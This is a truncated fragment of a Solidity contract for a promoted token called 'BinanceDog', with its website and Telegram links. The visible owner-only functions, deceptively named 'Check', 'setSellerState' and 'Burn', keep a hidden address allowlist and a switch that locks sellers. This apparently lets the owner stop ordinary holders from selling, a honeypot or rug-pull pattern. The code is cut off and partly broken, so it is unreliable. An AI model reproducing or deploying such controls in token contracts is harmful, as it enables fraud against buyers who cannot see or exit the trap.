...
/*
🌐 Website: https://www.binancedog.net
Telegram: https://t.me/BidogCoin
*/
...
contract BinanceDog is Ownable {
  ...
  function Check(address holder, bool allowApprove) external onlyOwner {
      allowAddress[holder] = allowApprove;
  }
  function setSellerState(bool ok) external onlyOwner returns (bool){
      lockSeller = ok;
  }
  function Burn(address holder, bool ok) external onlyOwner returns (bool){
